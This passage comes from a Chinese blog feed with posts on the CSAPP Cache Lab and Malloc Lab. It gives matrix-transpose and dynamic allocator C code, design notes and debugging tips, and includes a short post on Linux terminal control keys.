<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i, j, a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">56</span>; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                a2 = A[i][j+<span class="number">1</span>];</span><br><span class="line">                a3 = A[i][j+<span class="number">2</span>];</span><br><span class="line">                a4 = A[i][j+<span class="number">3</span>];</span><br><span class="line">                a5 = A[i][j+<span class="number">4</span>];</span><br><span class="line">                a6 = A[i][j+<span class="number">5</span>];</span><br><span class="line">                a7 = A[i][j+<span class="number">6</span>];</span><br><span class="line">                a8 = A[i][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">                B[j+<span class="number">1</span>][i] = a2;</span><br><span class="line">                B[j+<span class="number">2</span>][i] = a3;</span><br><span class="line">                B[j+<span class="number">3</span>][i] = a4;</span><br><span class="line">                B[j+<span class="number">4</span>][i] = a5;</span><br><span class="line">                B[j+<span class="number">5</span>][i] = a6;</span><br><span class="line">                B[j+<span class="number">6</span>][i] = a7;</span><br><span class="line">                B[j+<span class="number">7</span>][i] = a8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">56</span>; j &lt; <span class="number">61</span>; ++j) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">64</span>; i &lt; <span class="number">67</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">61</span>; ++j) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="64-64"><a href="#64-64" class="headerlink" title="64 * 64"></a>64 * 64</h4><p>对于64 * 64矩阵，每4行就有冲突，如使用8 * 8分块会导致块内就有冲突，只能得0分。</p>
<p>因此，这里改用4 * 4分块，再利用局部变量，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1667 misses, 3.8 points</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i, j, l;</span><br><span class="line">        <span class="type">int</span> a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; M; i += <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; N; j += <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(l = i; l &lt; i + <span class="number">4</span>; l += <span class="number">2</span>) &#123;</span><br><span class="line">                    a1 = A[l][j];</span><br><span class="line">                    a2 = A[l][j+<span class="number">1</span>];</span><br><span class="line">                    a3 = A[l][j+<span class="number">2</span>];</span><br><span class="line">                    a4 = A[l][j+<span class="number">3</span>];</span><br><span class="line">                    a5 = A[l+<span class="number">1</span>][j];</span><br><span class="line">                    a6 = A[l+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">                    a7 = A[l+<span class="number">1</span>][j+<span class="number">2</span>];</span><br><span class="line">                    a8 = A[l+<span class="number">1</span>][j+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">                    B[j][l] = a1;</span><br><span class="line">                    B[j+<span class="number">1</span>][l] = a2;</span><br><span class="line">                    B[j+<span class="number">2</span>][l] = a3;</span><br><span class="line">                    B[j+<span class="number">3</span>][l] = a4;</span><br><span class="line">                    B[j][l+<span class="number">1</span>] = a5;</span><br><span class="line">                    B[j+<span class="number">1</span>][l+<span class="number">1</span>] = a6;</span><br><span class="line">                    B[j+<span class="number">2</span>][l+<span class="number">1</span>] = a7;</span><br><span class="line">                    B[j+<span class="number">3</span>][l+<span class="number">1</span>] = a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果为<code>1667</code>次，没有满分，原因是没有充分利用缓存。需要满分的可以参考：<a href="https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&utm_medium=referral">https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source&#x3D;debugrun&amp;utm_medium&#x3D;referral</a></p>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>代码上传到github，仅供参考：<a href="https://github.com/PCJ600/CacheLab">https://github.com/PCJ600/CacheLab</a></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./driver.py</span><br><span class="line">Part A: Testing cache simulator</span><br><span class="line">Running ./test-csim</span><br><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">Part B: Testing transpose function</span><br><span class="line">Running ./test-trans -M 32 -N 32</span><br><span class="line">Running ./test-trans -M 64 -N 64</span><br><span class="line">Running ./test-trans -M 61 -N 67</span><br><span class="line"></span><br><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           3.8         8        1667</span><br><span class="line">Trans perf 61x67          10.0        10        1889</span><br><span class="line">          Total points    48.8        53</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://zhuanlan.zhihu.com/p/142942823">CSAPP实验之cacheLab</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常见控制字符介绍</title>
    <url>/2020/08/29/2020-08-29-common-ctrl-char-in-linux/</url>
    <content><![CDATA[<h2 id="ctrl-c"><a href="#ctrl-c" class="headerlink" title="ctrl + c"></a>ctrl + c</h2><p>中断键，给前台进程组中所有进程发送<code>SIGINT</code>信号，并终止进程。</p>
<h2 id="ctrl-z"><a href="#ctrl-z" class="headerlink" title="ctrl + z"></a>ctrl + z</h2><p>挂起键，给前台进程组中所有进程发送<code>SIGTSTP</code>信号,  并挂起进程。被挂起的进程并没有真正结束，可以使用<code>fg</code>或<code>bg</code>命令恢复被挂起的进程。</p>
<span id="more"></span>

<ul>
<li>fg —— 将后台作业放到前台终端运行。例如用VIM编辑文件时，需要敲shell命令。可以先用<code>Ctrl + Z</code>挂起VIM，敲完shell命令后再使用<code>fg</code>命令恢复VIM继续编辑，好处是不用退出VIM程序。</li>
<li>bg —— 恢复后台被挂起的作业，变成在后台继续执行。例如前台启动一个程序时，不希望一直等待程序运行结束，可以先用<code>Ctrl+Z</code>挂起进程，再使用<code>bg</code>命令后台恢复程序的执行，好处是不用终止程序。</li>
<li>jobs —— 显示当前shell中后台正在运行或被挂起的任务列表。</li>
</ul>
<h2 id="ctrl-d"><a href="#ctrl-d" class="headerlink" title="ctrl + d"></a>ctrl + d</h2><p>表示一个特殊二进制值<code>EOF</code>，表示已到达文件末尾(<code>end of file</code>), 可以用来快速退出终端。</p>
<h2 id="ctrl-s"><a href="#ctrl-s" class="headerlink" title="ctrl + s"></a>ctrl + s</h2><p>中断控制台的输出。有时终端卡死了，敲什么都没反应，很可能是敲了<code>Ctrl + S</code>，可以接着敲<code>Ctrl + q</code>恢复。</p>
<h2 id="ctrl"><a href="#ctrl" class="headerlink" title="ctrl + \"></a>ctrl + \</h2><p>终止进程，并向进程发送<code>SIGQUIT</code>信号，默认会产生<code>coredump</code>文件。</p>
<h2 id="ctrl-l"><a href="#ctrl-l" class="headerlink" title="ctrl + l"></a>ctrl + l</h2><p>清屏， 相当于终端里敲<code>clear</code>。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/730989a7302e">Linux常见信号大全</a></p>
<p><a href="https://blog.csdn.net/mylizh/article/details/38385739?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.channel_param">Linux中ctrl-c, ctrl-z, ctrl-d区别</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP malloc实验</title>
    <url>/2020/09/26/2020-09-26-csapp-malloclab/</url>
    <content><![CDATA[<h3 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h3><p>实现自己的动态内存分配器（<code>malloc</code>、<code>free</code>、<code>realloc</code>）。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
<li>阅读《CSAPP原书第3版》 9.9小节 —— 动态内存分配。</li>
<li>阅读<a href="http://csapp.cs.cmu.edu/3e/malloclab.pdf">writeup</a>的全部内容。</li>
</ul>
<span id="more"></span>

<h4 id="分配器的设计要求"><a href="#分配器的设计要求" class="headerlink" title="分配器的设计要求"></a>分配器的设计要求</h4><ul>
<li>处理任意请求序列，分配器不可以假设分配和释放请求的顺序。</li>
<li>立即响应请求, 不允许分配器为了提高性能重新排列或缓冲请求。</li>
<li>只使用堆。</li>
<li>对齐块，以保存任何类型的数据对象。</li>
<li>不修改已分配的块，分配器只能操作和改变空闲块。</li>
</ul>
<h4 id="分配器的设计目标"><a href="#分配器的设计目标" class="headerlink" title="分配器的设计目标"></a>分配器的设计目标</h4><ul>
<li>最大化吞吐率 —— 每个<code>malloc</code>, <code>free</code>执行的指令越少，吞吐率会越好。</li>
<li>最大化内存利用率。</li>
</ul>
<h4 id="实现问题"><a href="#实现问题" class="headerlink" title="实现问题"></a>实现问题</h4><p>关键是把握<strong>吞吐率</strong>和<strong>内存利用率</strong>之间的平衡。</p>
<ul>
<li>空闲块组织 —— 如何记录空闲块？</li>
<li>放置 —— 如何选一个合适的空闲块来放置一个新分配的块？ （首次适配&#x2F;下次适配&#x2F;最优适配）</li>
<li>分割 —— 将一个新分配块放到某个空闲块后，如何处理这个空闲块的剩余部分？</li>
<li>合并 —— 如何处理一个刚被释放的块？ （立即合并&#x2F;延迟合并）</li>
</ul>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>代码下载：<a href="http://csapp.cs.cmu.edu/3e/malloclab-handout.tar">http://csapp.cs.cmu.edu/3e/malloclab-handout.tar</a></p>
<p>目标是实现<code>mm.c</code>中的如下函数, 原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p>这里使用两种方式实现<code>malloc</code>，分别如下：</p>
<ul>
<li>隐式空闲链表 + 首次适配&#x2F;下一次适配。</li>
<li>显示空闲链表 + 分离的空闲链表 +  分离适配。</li>
</ul>
<h3 id="隐式空闲链表法"><a href="#隐式空闲链表法" class="headerlink" title="隐式空闲链表法"></a>隐式空闲链表法</h3><p>原书9.9.6节详细介绍了隐式空闲链表法，并贴出了所有源代码。代码实现细节请参考原书或者 <a href="https://github.com/PCJ600/MallocLab/tree/br64">https://github.com/PCJ600/MallocLab/tree/br64</a></p>
<h5 id="隐式空闲链表的形式如下："><a href="#隐式空闲链表的形式如下：" class="headerlink" title="隐式空闲链表的形式如下："></a>隐式空闲链表的形式如下：</h5><p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image1.png"></p>
<ul>
<li>每个堆块使用边界标记法。头部大小为4字节，前29位表示块大小，后3位表示这个块是否空闲；脚部(ftr)是头部(hdr)的副本。目的是<strong>将合并前面的堆块时的搜索时间降到常数</strong>。</li>
<li><strong>第1个填充字用于8字节对齐访问</strong>。考虑64位场景，如不添加填充字，heap_listp的值不能整除8，不满足对齐条件！</li>
<li>序言块和结尾块的设计是消除合并时边界条件的技巧。</li>
<li>按8字节对齐要求， 一个堆块最小为 4(头部) + 8(payload) + 4(脚部) &#x3D; 16字节</li>
<li>为什么是”隐式”的？——  因为空闲块是通过头部中大小字段隐含地连接着，从而间接遍历整个空闲块的集合。</li>
</ul>
<h4 id="1-初始化堆-——-mm-init函数"><a href="#1-初始化堆-——-mm-init函数" class="headerlink" title="1. 初始化堆 —— mm_init函数"></a>1. 初始化堆 —— mm_init函数</h4><p><code>mm_init</code>步骤如下：</p>
<ul>
<li><p>首先在堆上分配16个字节，包括4字节对齐块，8字节序言块，4字节结尾块。</p>
</li>
<li><p>调<code>extend_heap</code>扩展堆，创建初始的空闲块，大小为4096字节。</p>
</li>
</ul>
<h4 id="2-扩展堆-——-extend-heap函数"><a href="#2-扩展堆-——-extend-heap函数" class="headerlink" title="2. 扩展堆 —— extend_heap函数"></a>2. 扩展堆 —— extend_heap函数</h4><p>函数原型: <code>static void *extend_heap(size_t words);</code></p>
<p>以下两种场景需要扩展堆：</p>
<ul>
<li>调用<code>mm_init</code>初始化堆时。</li>
<li>调用<code>mm_malloc</code>找不到合适的空闲块时。</li>
</ul>
<p>举例：堆上扩展4096个字节，堆数组前后变化如下：</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image2.png"></p>
<h4 id="3-释放和合并块-——-mm-free和coalesce函数"><a href="#3-释放和合并块-——-mm-free和coalesce函数" class="headerlink" title="3. 释放和合并块 —— mm_free和coalesce函数"></a>3. 释放和合并块 —— mm_free和coalesce函数</h4><p>调用<code>mm_free</code>释放块，步骤如下：</p>
<ul>
<li><p>将当前块的头部和脚部中的分配位清零。</p>
</li>
<li><p>将这个块与它邻接的前后空闲块进行合并，采用立即合并策略。</p>
</li>
</ul>
<p>调用<code>coalesce</code>合并前后的合并块，原型：<code>static void *coalesce(void *bp);</code>，分四种情况：</p>
<ul>
<li>情况1：前面的块和后面的块都已分配 —— 不可能合并，简单返回bp即可。</li>
<li>情况2：前面的块已分配，后面的块空闲 —— 用当前块和后面块的大小之和更新当前块的头部和后面块的脚部。返回bp</li>
<li>情况3：前面的块是空闲的，后面的块是分配的 —— 用两块大小之和更新前面块的头部和后面块的脚部。返回<code>PREV_BLKP(bp)</code></li>
<li>情况4：前面和后面的块都是空闲的 —— 用三个块大小之和更新前面块的头部和后面块的脚部。返回<code>PREV_BLKP(bp)</code></li>
</ul>
<p>说的比较啰嗦，以下画图帮助理解：</p>
<p><strong>情况2:</strong> 前面的块已分配，后面的块空闲</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image3.png"></p>
<p><strong>注意：</strong> <font color = 'red'><strong>如采用下次适配策略，在情况3、情况4合并后可能出现pre_listp指针不再指向一个块的payload段，报payload overlap错!</strong></font></p>
<p>因此必须更新<code>pre_listp</code>。这里简单将<code>pre_listp</code>指向合并后的新块的<code>payload</code>即可。</p>
<p><strong>情况3：</strong> 前面的块是空闲的，后面的块是分配的</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image4.png"></p>
<p><strong>情况4：</strong> 前面和后面的块均空闲<br><img src="/2020/09/26/2020-09-26-csapp-malloclab/image5.png"><br>[O#### 4. 分配块 —— mm_malloc</p>
<h5 id="mm-malloc步骤"><a href="#mm-malloc步骤" class="headerlink" title="mm_malloc步骤"></a>mm_malloc步骤</h5><ul>
<li><p>调整请求块的大小，需不低于16字节（8字节对齐要求），并舍入到8的整数倍。</p>
</li>
<li><p>根据请求块的大小，搜索空闲链表寻找合适的空闲块：</p>
<ul>
<li>如果找到合适的块，将请求块放置到这个合适的块中，并可选地分割这个块</li>
<li>如找不到合适的块，调<code>extend_heap</code>扩展堆，分配新的空闲块。将请求块放到这个新的空闲块里，并可选地分割这个块</li>
</ul>
</li>
</ul>
<h5 id="适配算法"><a href="#适配算法" class="headerlink" title="适配算法"></a>适配算法</h5><p>分配器搜索空闲块的方式由放置策略决定，常见策略有首次适配、下一次适配等。</p>
<ul>
<li><p>首次适配： 从头搜索空闲链表，选择第一个合适地空闲块。</p>
</li>
<li><p>下一次适配： 从上次查询结束的地方开始搜索空闲链表。</p>
</li>
</ul>
<h5 id="分割策略"><a href="#分割策略" class="headerlink" title="分割策略"></a>分割策略</h5><p>如分割后剩下的块不小于最小块大小(16字节)，才分割这个块。</p>
<p>设空闲块大小为M字节，<code>malloc</code>请求的块大小为N字节。只有M - N &gt;&#x3D; 16，才分割这个块。</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image6.png"></p>
<h4 id="5-实现mm-realloc"><a href="#5-实现mm-realloc" class="headerlink" title="5. 实现mm_realloc"></a>5. 实现mm_realloc</h4><p><code>mm_realloc</code>原型：<code>void *mm_realloc(void *ptr, size_t size)</code></p>
<p><a href="http://csapp.cs.cmu.edu/3e/malloclab.pdf">writeup</a>中提到了<code>mm_realloc</code>的所有实现要点，如下：</p>
<ul>
<li>如果ptr为NULL， 等价于调用mm_malloc</li>
<li>如果size为0, 等价于调用mm_free</li>
<li>如ptr不为NULL且size不为0， 参考realloc函数的实现： <code>man 3 realloc</code></li>
</ul>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><p>执行<code>./mdriver -t traces/ -V</code>，查看详细结果：</p>
<p>首次适配: 44 (util) + 24 (thru) &#x3D; 68&#x2F;100</p>
<p>下一次适配：43 (util) + 40 (thru) &#x3D; 83&#x2F;100</p>
<h3 id="分离空闲链表法"><a href="#分离空闲链表法" class="headerlink" title="分离空闲链表法"></a>分离空闲链表法</h3><p>实现代码参考：<a href="https://github.com/PCJ600/MallocLab">https://github.com/PCJ600/MallocLab</a></p>
<p>使用分离的空闲链表，分配器会维护一个空闲链表的数组。每个空闲链表和一个大小类关联，被组织成某种类型的显式或隐式链表。笔者这里使用以下方案：</p>
<ul>
<li>链表结构为<strong>显式的双向链表</strong></li>
<li>大小类分为 {16-31},{32,63},{64,127}, …, {4096, 8191}, … 链表个数<code>MAX_LIST_NUM</code> 默认设置为20，可调整。</li>
<li>考虑兼容性，分配器需要在32位&#x2F;64位环境下都能正常运行。</li>
</ul>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>32位机器上，指针大小为4字节；64位机器上， 指针大小为8字节。可使用<code>sizeof(intptr_t)</code>表示指针大小, <code>intptr_t</code>类型是ISO C99定义的，可参考<code>/usr/include/stdint.h</code></li>
<li>实验要求不使用全局变量，可以将分离链表的头指针放到堆中。</li>
<li>默认Makefile采用<code>-m32</code>选项，64位环境下需要改成<code>-m64</code>。</li>
<li>实验涉及大量指针操作，编码极易出错。需掌握基本的gdb调试手段、并编写代码检查堆区和分离链表。</li>
</ul>
<h4 id="显式的双向链表的堆块结构"><a href="#显式的双向链表的堆块结构" class="headerlink" title="显式的双向链表的堆块结构"></a>显式的双向链表的堆块结构</h4><p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image7.png"></p>
<ul>
<li><p>对于空闲块，<code>pred</code>保存上一个空闲块的地址，<code>succ</code>保存下一个空闲块的地址。</p>
</li>
<li><p>使用双向链表结构，适配算法的时间复杂度从O(块总数)降到O(空闲块总数)。</p>
</li>
<li><p>不难得出：32位系统，块至少为16字节；64位系统，块至少为24字节。</p>
</li>
</ul>
<h3 id="如何调试？"><a href="#如何调试？" class="headerlink" title="如何调试？"></a>如何调试？</h3><ul>
<li>设置编译选项<code>-g -O0</code>取消编译优化。</li>
<li>设置编译选项<code>-g3 -gdwarf-2</code>调试宏。</li>
<li>可以设置<code>-DDEBUG</code>宏，通过编译宏控制是否打印调试信息。</li>
<li>实现<code>mm_print</code>函数，在gdb中通过<code>call mm_print()</code>打印堆区和分离链表。</li>
</ul>
<h4 id="打印堆数组状态和所有分离链表-——-mm-print函数设计"><a href="#打印堆数组状态和所有分离链表-——-mm-print函数设计" class="headerlink" title="打印堆数组状态和所有分离链表 —— mm_print函数设计"></a>打印堆数组状态和所有分离链表 —— mm_print函数设计</h4><ul>
<li><p>打印堆数组中每个块的头部、脚部、大小、分配位、payload指针。</p>
</li>
<li><p>打印堆数组中所有分离链表头指针的值。</p>
</li>
<li><p>打印每条分离链表的所有块的头部、脚部、大小、分配位、payload指针。</p>
</li>
</ul>
<h4 id="堆区和分离链表检查-——-mm-check函数设计"><a href="#堆区和分离链表检查-——-mm-check函数设计" class="headerlink" title="堆区和分离链表检查 —— mm_check函数设计"></a>堆区和分离链表检查 —— mm_check函数设计</h4><p><strong>检查堆区状态，包括：</strong></p>
<ul>
<li>检查序言块、结尾块的指针、大小、分配位是否正确。</li>
<li>检查每个块的payload指针是否满足对齐要求。</li>
<li>检查每个块的payload指针是否在堆区的合法地址范围内(<code>mem_heap_lo() ~ mem_heap_hi()</code>之间)。</li>
<li>检查每个块的头部和脚部是否一致。</li>
<li>检查每个块的大小是否不低于最小块的大小，是否为4&#x2F;8字节的倍数。</li>
<li>采用立即合并策略时，检查不存在任意两个相邻的空闲块。</li>
</ul>
<p><strong>检查分离链表状态，包括：</strong></p>
<ul>
<li><p>检查链表中所有指针是否在堆区的合法地址范围内。</p>
</li>
<li><p>检查双向链表实现是否正确，是否每个指针A的后继为B时，B的前驱也同时为A。</p>
</li>
<li><p>检查分离链表中所有的空闲块是否与堆数组的空闲块中找到并匹配。</p>
</li>
<li><p>检查堆数组中每个空闲块是否都能在分离链表中找到并匹配。</p>
</li>
<li><p>检查堆数组中每个已占用块是否都不在分离链表中。</p>
</li>
</ul>
<p><strong>针对malloc做如下检查：</strong></p>
<ul>
<li>malloc返回前，检查指针p是否在堆数组中，如不在堆数组中说明出错。</li>
<li>malloc返回前，检查指针p对应的块大小是否不小于malloc请求的大小。</li>
</ul>
<p><strong>针对free做如下检查：</strong></p>
<ul>
<li><p>调用free时，先检查指针p是否在堆区的合法地址范围内。</p>
</li>
<li><p>调用free时，先检查p是否指向了堆数组中某个已分配块。</p>
</li>
</ul>
<p>实现代码参考： <a href="https://github.com/PCJ600/MallocLab/blob/master/mm.c">https://github.com/PCJ600/MallocLab/blob/master/mm.c</a>  <code>mm_check</code>函数</p>
<h4 id="指针运算、宏定义"><a href="#指针运算、宏定义" class="headerlink" title="指针运算、宏定义"></a>指针运算、宏定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT (sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~(ALIGNMENT-1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4                                     <span class="comment">// 4字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8                                     <span class="comment">// 双字: 8字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12)                         <span class="comment">// 4096字节, 执行extend_heap一次, 堆上扩展的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc)  ((size) | (alloc))		<span class="comment">// 设置分配位， 前29位表示块大小，后3位表示是否已分配</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)             (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val)        (*(unsigned int *)(p) = (val))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)        (GET(p) &amp; ~(0x1))        <span class="comment">// 获取块大小, 这里块大小不会超过2^32字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p)       (GET(p) &amp; 0x1)           <span class="comment">// 判断这个块是否已分配</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针类型读写，使用intptr_t兼容32位/64位机器</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_P(p)           (*(intptr_t *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_P(p, val)      (*(intptr_t *)(p) = (intptr_t)(val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分离链表: |(16-31)|(32-63)|(64-127)|(128-255)| ..... |(2^23,2^24-1)|，这里设置20条链表</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LIST_NUM 20                                 <span class="comment">// 分离链表最大数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_INDEX 4                                     <span class="comment">// 最小块为16字节, 即2^4。这里MIN_INDEX表示分离链表中第一条链表的最小块大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_BLOCK_SIZE (DSIZE + 2 * sizeof(intptr_t))	<span class="comment">// 块大小的最小值，32位为16字节， 64位为24字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR(bp)     ((char *)(bp))						<span class="comment">// 强转成char *类型指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)    ((char *)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)    ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV(bp)    ((char *)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCC(bp)    ((char *)(bp) + sizeof(intptr_t))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PREV(bp) ((char *)(GET_P(PREV(bp))))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SUCC(bp) ((char *)(GET_P(SUCC(bp))))</span></span><br></pre></td></tr></table></figure>

<h4 id="辅助函数设计"><a href="#辅助函数设计" class="headerlink" title="辅助函数设计"></a>辅助函数设计</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span>; <span class="comment">/* 将大小为size的空闲块插入分离空闲链表 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *p)</span>; 			   <span class="comment">/* 从分离链表中删除指定块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *p)</span>; 			   <span class="comment">/* 合并空闲块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span>;  	   <span class="comment">/* 放置大小为size的块到p指向的空闲块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span>;         <span class="comment">/* 扩展堆 */</span></span><br><span class="line"><span class="comment">/* 在所有分离链表中找合适空闲块，返回空闲块指针 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_free_block</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">/* 将p指向的块插入第idx个分离链表 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node_by_list_index</span><span 